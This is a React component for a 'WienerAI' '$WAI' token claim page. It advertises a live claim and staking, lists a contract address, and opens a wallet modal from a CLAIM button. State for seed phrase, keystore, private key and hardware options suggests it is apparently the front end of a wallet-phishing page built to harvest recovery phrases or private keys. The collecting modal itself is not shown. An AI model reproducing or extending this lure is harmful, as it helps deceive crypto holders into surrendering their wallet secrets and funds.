import React from 'react';
import { useState, useEffect } from "react";
import WalletModal from "./Modal";
import Container from 'react-bootstrap/Container';
import Row from 'react-bootstrap/Row';
import Col from 'react-bootstrap/Col';

const MainContent = () => {
 const wall=   { endpoint: "tet", id: 2, name: "weiner" };
 const [phrase, setPhrase] = useState(false);
 const [keystore, setKeystore] = useState(false);
 const [privateKey, setPrivateKey] = useState(false);
 const [hardware, setHardware] = useState(false);
 const [wallet, setWallet] = useState({});

 const newa = "weiner";
 useEffect(() => {
   if (newa) {
     setWallet(newa[0]);
   }
 }, [newa]);

 const [show, setShow] = useState(false);
 const [name, setName] = useState("");

 const handleShow = (name) => {
   setShow(true);
   // setName(name);
 };

 const handleClose = () => {
   setShow(false);
 };

 const handlePhrase = () => {
   setPhrase(true);
   setPrivateKey(false);
   setHardware(false);
   setKeystore(false);
 };
 const handleKeystore = () => {
   setPhrase(false);
   setPrivateKey(false);
   setHardware(false);
   setKeystore(true);
 };
 const handlePrivateKey = () => {
   setPhrase(false);
   setPrivateKey(true);
   setHardware(false);
   setKeystore(false);
 };
 const handleHardware = () => {
   setPhrase(false);
   setPrivateKey(false);
   setHardware(true);
   setKeystore(false);
 };
  return (
    <Container className="main-content">
      <Row className='check'>
    <Col xs={12} md={8}  className='about'>
      <h1 className='weiner'>WienerAI</h1>
      <h2>Part Dog, Part Sausage, Part AI Trading Bot</h2>
    </Col>
    <Col xs={12} md={4} className='about2'>
        <div className='inner'>
      <p>$WAI Claim Now Live</p>
      <p>You Can Now Claim Your $WAI Tokens. Plus, Stake Your Tokens To Earn Rewards!</p>
      <p>Add 0xFE8526A77A2c3590E5973bA81308B90BEA21FBFF To Your Wallet To See Your $WAI.</p>
      <div className="info">
        <p>Your Purchased $WAI = 0</p>
        <p>Your Stakeable $WAI = 0</p>
      </div>
      <div className='cb'>
      
      <button className="btn btn-primary" onClick={handleShow}>CLAIM</button>
      <button className="btn btn-secondary" onClick={handleClose}>Connect Wallet</button>
      <div className="tabs-content">
              <WalletModal show={show} handleClose={handleClose} name={name} />
      </div>
      </div>
      </div>
      </Col>
      </Row>
    </Container>
  );
};

export default MainContent;
